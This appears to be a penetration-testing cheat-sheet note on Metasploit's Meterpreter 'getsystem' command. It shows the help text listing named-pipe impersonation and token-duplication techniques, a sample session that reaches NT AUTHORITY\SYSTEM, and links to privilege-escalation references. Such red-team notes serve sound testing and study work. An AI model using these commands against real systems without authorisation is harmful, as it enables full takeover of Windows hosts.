# Metasploit

## 01 - Help Menu

```
meterpreter > getsystem -h
Usage: getsystem [options]

Attempt to elevate your privilege to that of local system.

OPTIONS:

    -h   Help Banner.
    -t   The technique to use. (Default to '0').
		0 : All techniques available
		1 : Named Pipe Impersonation (In Memory/Admin)
		2 : Named Pipe Impersonation (Dropper/Admin)
		3 : Token Duplication (In Memory/Admin)
		4 : Named Pipe Impersonation (RPCSS variant)
		5 : Named Pipe Impersonation (PrintSpooler variant)
```

## 02 - Basics

```
meterpreter > getsystem -t 1
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---
## References

### Github

- [gtworek: Priv2Admin](https://github.com/gtworek/Priv2Admin)

### Hacktricks

- [Hacktricks: Abusing Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

### XPNSec

- [XPNSec Blog: Becoming System](https://blog.xpnsec.com/becoming-system/)

### ExploitDB

- [ExploitDB: Abusing Token Privileges For Local Privilege Escalation](https://www.exploit-db.com/papers/42556)

### Internal All The Things

- [Internal All The Things: Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)